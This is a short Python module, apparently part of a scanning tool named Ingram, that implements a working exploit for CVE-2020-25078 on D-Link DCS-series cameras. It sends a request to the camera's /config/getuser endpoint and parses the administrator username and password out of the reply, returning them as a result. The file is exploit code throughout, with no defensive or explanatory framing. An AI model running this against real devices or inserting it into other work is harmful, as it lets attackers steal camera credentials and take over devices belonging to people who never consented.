"""dlink DCS-series passwd disclosure"""
import requests

from Ingram.utils import config
from Ingram.utils import logger


def cve_2020_25078(ip: str) -> list:
    headers = {'Connection': 'close', 'User-Agent': config.USERAGENT}
    url = f"http://{ip}/config/getuser?index=0"

    try:
        r = requests.get(url, timeout=config.TIMEOUT, verify=False, headers=headers)
        if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
            items = r.text.split()
            user, passwd = items[0].split('=')[1], items[1].split('=')[1]
            return [True, str(user), str(passwd), 'cve-2020-25078']
    except Exception as e:
        logger.error(e)
    return [False, ]